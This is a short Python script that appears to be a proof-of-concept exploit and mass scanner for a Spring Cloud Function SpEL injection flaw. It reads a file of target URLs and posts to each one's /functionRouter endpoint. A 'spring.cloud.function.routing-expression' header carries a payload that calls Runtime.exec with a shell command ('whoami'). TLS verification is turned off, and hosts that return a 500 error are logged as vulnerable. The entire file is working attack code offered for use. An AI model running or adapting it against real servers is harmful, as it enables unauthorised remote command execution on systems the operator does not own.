import requests
import sys
import threading
import urllib3
urllib3.disable_warnings()


def scan(txt,cmd):

    payload=f'T(java.lang.Runtime).getRuntime().exec("{cmd}")'

    data ='test'
    headers = {
        'spring.cloud.function.routing-expression':payload,
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    path = '/functionRouter'
    f = open(txt)
    urllist=f.readlines()

    for  url  in  urllist :
        url = url.strip('\n')
        all = url + path
        try:
            req=requests.post(url=all,headers=headers,data=data,verify=False,timeout=3)
            code =req.status_code
            text = req.text
            rsp = '"error":"Internal Server Error"'

            if code == 500 and rsp in text:
                print ( f'[+] { url } is vulnerable' )
                poc_file = open('vulnerable.txt', 'a+')
                poc_file.write(url + '\n')
                poc_file.close()
            else:
                print ( f'[-] { url } not vulnerable' )

        except requests.exceptions.RequestException:
            print ( f'[-] { url } detection timed out' )
            continue
        except:
            print ( f'[-] { url } error' )
            continue



if __name__ == '__main__' :
    try:
        cmd1 =sys.argv[1]
        t = threading . Thread ( target = scan ( cmd1 , 'whoami' ) ) 
        t.start()
    except:
        print ( 'Usage:' )
        print('python poc.py url.txt')
        pass
